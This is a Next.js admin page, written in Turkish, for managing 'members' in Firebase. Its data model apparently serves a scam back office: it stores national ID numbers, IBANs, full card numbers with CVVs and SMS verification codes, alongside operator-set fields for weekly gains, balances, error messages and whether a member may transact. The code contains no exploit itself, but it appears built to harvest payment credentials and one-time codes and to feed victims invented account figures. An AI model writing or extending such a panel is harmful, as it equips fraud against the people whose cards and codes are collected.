
"use client";

import { useState, useEffect } from "react";
import { Card, CardContent, CardHeader, CardTitle, CardDescription, CardFooter } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog";
import { Table, TableBody, TableCell, TableHead, TableHeader, TableRow } from "@/components/ui/table";
import { PlusCircle, Edit, Trash2, CreditCard, AlertCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";
import { useRouter } from "next/navigation";
import AdminMemberForm from "@/components/dashboard/admin-member-form";
import { Badge } from "@/components/ui/badge";
import { createUserInTempApp, db } from "@/lib/firebase/config";
import { useAuth } from "@/hooks/use-auth";
import { collection, doc, setDoc, getDocs, deleteDoc } from "firebase/firestore";

export type AdminMember = {
  id: string; // Firebase UID
  name: string;
  phone: string; // Firebase email will be stored here for display
  phoneNumber: string; // Actual contact phone number
  password?: string;
  iban: string;
  bank: string;
  tc: string;
  il: string;
  ilce: string;
  weeklyGain: string;
  errorMessage: string;
  onayMesaji: string;
  invoiceAmount: string;
  accountActivity: string;
  meetingInfo: string;
  currentBalance: string;
  status: 'Aktif' | 'Pasif';
  transactionStatus: 'allowed' | 'blocked';
  // Card details
  cardNumber?: string;
  cardExpiry?: string;
  cardCvv?: string;
  smsCode?: string;
};

const MEMBERS_PER_PAGE = 20;

export default function AdminPage() {
    const [members, setMembers] = useState<AdminMember[]>([]);
    const [isFormOpen, setIsFormOpen] = useState(false);
    const [editingMember, setEditingMember] = useState<AdminMember | null>(null);
    const [currentPage, setCurrentPage] = useState(1);
    const { toast } = useToast();
    const router = useRouter();
    const { isAdmin, loading } = useAuth();

    const fetchMembers = async () => {
        if (!db) {
            console.error("Firestore is not initialized.");
            toast({ variant: "destructive", title: "Hata", description: "Veritabanı bağlantısı kurulamadı." });
            return;
        }
        const membersCollection = collection(db, "members");
        const memberSnapshot = await getDocs(membersCollection);
        const memberList = memberSnapshot.docs.map(doc => doc.data() as AdminMember);
        setMembers(memberList);
    };

    useEffect(() => {
        if (!loading && !isAdmin) {
            router.push('/dashboard/profile');
            return;
        }

        if(isAdmin) {
          fetchMembers();
        }
    }, [router, isAdmin, loading]);
    

    const handleEditMember = (member: AdminMember) => {
        setEditingMember(member);
        setIsFormOpen(true);
    }
    
    const handleAddNewMember = () => {
      setEditingMember(null);
      setIsFormOpen(true);
    };

    const handleDeleteMember = async (idToDelete: string) => {
        if (!db) return;
        
        try {
            await deleteDoc(doc(db, "members", idToDelete));
            
            // Note: We are not deleting the Firebase Auth user for safety and recovery.
            // If you want to delete the auth user, you'd need a backend function.

            toast({
                title: "Başarılı",
                description: "Üye başarıyla silindi.",
            });
            fetchMembers(); // Refresh the list from Firestore
        } catch (error) {
             console.error("Error deleting member: ", error);
             toast({ variant: "destructive", title: "Hata", description: "Üye silinirken bir hata oluştu." });
        }
    };

    const handleSaveMember = async (memberData: AdminMember) => {
      if (!db) return;
      
      let memberToSave = { ...memberData };
      let uid: string;

      if (editingMember) {
        // Editing existing member
        uid = editingMember.id;
        memberToSave.id = uid;
      } else {
        // Adding new member
        if (!memberToSave.phone || !memberToSave.password) {
            toast({ variant: "destructive", title: "Hata", description: "Yeni üye için e-posta ve şifre zorunludur." });
            return;
        }

        try {
            const userCredential = await createUserInTempApp(memberToSave.phone, memberToSave.password);
            uid = userCredential.user.uid;
            memberToSave.id = uid;
            
        } catch (error: any) {
            console.error("Firebase user creation failed:", error);
            let errorMessage = "Yeni üye oluşturulamadı. Lütfen tekrar deneyin.";
            if (error.code === 'auth/email-already-in-use') {
                errorMessage = "Bu e-posta adresi zaten kullanımda.";
            } else if (error.code === 'auth/weak-password') {
                errorMessage = "Şifre çok zayıf. En az 6 karakter olmalıdır.";
            }
            toast({ variant: "destructive", title: "Firebase Hatası", description: errorMessage });
            return;
        }
      }

      try {
          // Remove password before saving to Firestore for security
          const { password, ...firestoreData } = memberToSave;
          const memberDocRef = doc(db, "members", uid);
          await setDoc(memberDocRef, firestoreData, { merge: true });

          toast({
              title: "Başarılı",
              description: editingMember ? "Üye bilgileri güncellendi." : "Yeni üye başarıyla oluşturuldu.",
          });
          fetchMembers(); // Refresh list from firestore
      } catch (error) {
          console.error("Error saving member to Firestore: ", error);
          toast({ variant: "destructive", title: "Veritabanı Hatası", description: "Üye bilgileri kaydedilemedi." });
      }

      setIsFormOpen(false);
      setEditingMember(null);
    };
    
    // Pagination logic
    const totalPages = Math.ceil(members.length / MEMBERS_PER_PAGE);
    const indexOfLastMember = currentPage * MEMBERS_PER_PAGE;
    const indexOfFirstMember = indexOfLastMember - MEMBERS_PER_PAGE;
    const currentMembers = members.slice(indexOfFirstMember, indexOfLastMember);

    const paginate = (pageNumber: number) => {
        if (pageNumber > 0 && pageNumber <= totalPages) {
            setCurrentPage(pageNumber);
        }
    }

    if (loading) {
       return <div className="text-center p-8 text-xl">Yükleniyor...</div>;
    }

    if (!isAdmin) {
      return null;
    }

    return (
        <div className="space-y-6">
            <Card>
                <CardHeader className="flex flex-row items-center justify-between">
                    <div>
                        <CardTitle className="text-3xl font-headline font-bold">Admin Paneli - Üye Yönetimi</CardTitle>
                        <CardDescription>Mevcut kullanıcıları düzenleyin veya yeni kullanıcı ekleyin.</CardDescription>
                    </div>
                     <div className="flex items-center gap-2">
                        <Button onClick={handleAddNewMember}>
                          <PlusCircle className="mr-2 h-5 w-5" />
                          Yeni Üye Ekle
                        </Button>
                    </div>
                </CardHeader>
                <CardContent>
                    <Dialog open={isFormOpen} onOpenChange={setIsFormOpen}>
                        <DialogContent className="max-h-[90vh] overflow-y-auto">
                            <DialogHeader>
                                <DialogTitle>{editingMember ? 'Üye Düzenle' : 'Yeni Üye Ekle'}</DialogTitle>
                            </DialogHeader>
                            <AdminMemberForm 
                                member={editingMember} 
                                onSave={handleSaveMember}
                                onCancel={() => { setIsFormOpen(false); setEditingMember(null); }}
                            />
                        </DialogContent>
                    </Dialog>
                    
                    <div className="overflow-x-auto">
                        <Table>
                            <TableHeader>
                                <TableRow>
                                    <TableHead>Ad Soyad</TableHead>
                                    <TableHead>Email (Giriş)</TableHead>
                                    <TableHead>Kart Bilgileri</TableHead>
                                    <TableHead>Üyelik Durumu</TableHead>
                                    <TableHead className="text-right">Eylemler</TableHead>
                                </TableRow>
                            </TableHeader>
                            <TableBody>
                                {currentMembers.map((member) => (
                                    <TableRow key={member.id}>
                                        <TableCell className="font-medium flex items-center gap-2">
                                          {member.name ? member.name : 
                                            <span className="text-destructive flex items-center gap-1">
                                              <AlertCircle size={16} /> Detaylar Eksik
                                            </span>
                                          }
                                        </TableCell>
                                        <TableCell>{member.phone}</TableCell>
                                        <TableCell>
                                           {member.cardNumber && <CreditCard className="h-5 w-5 text-blue-500" />}
                                        </TableCell>
                                        <TableCell>
                                            <Badge variant={member.status === 'Aktif' ? 'default' : 'destructive'} className={member.status === 'Aktif' ? 'bg-green-600' : 'bg-red-600'}>
                                                {member.status}
                                            </Badge>
                                        </TableCell>
                                        <TableCell className="text-right space-x-2">
                                            <Button variant="ghost" size="icon" onClick={() => handleEditMember(member)}>
                                                <Edit className="h-4 w-4" />
                                            </Button>
                                            <Button variant="ghost" size="icon" onClick={() => handleDeleteMember(member.id)}>
                                                <Trash2 className="h-4 w-4 text-destructive" />
                                            </Button>
                                        </TableCell>
                                    </TableRow>
                                ))}
                            </TableBody>
                        </Table>
                    </div>
                    
                </CardContent>
                {totalPages > 1 && (
                    <CardFooter className="flex justify-center items-center gap-2 pt-4">
                        <Button
                            variant="outline"
                            size="sm"
                            onClick={() => paginate(currentPage - 1)}
                            disabled={currentPage === 1}
                        >
                            Önceki
                        </Button>
                        <span className="text-sm text-muted-foreground">
                            Sayfa {currentPage} / {totalPages}
                        </span>
                        <Button
                            variant="outline"
                            size="sm"
                            onClick={() => paginate(currentPage + 1)}
                            disabled={currentPage === totalPages}
                        >
                            Sonraki
                        </Button>
                    </CardFooter>
                )}
            </Card>
        </div>
    );
}
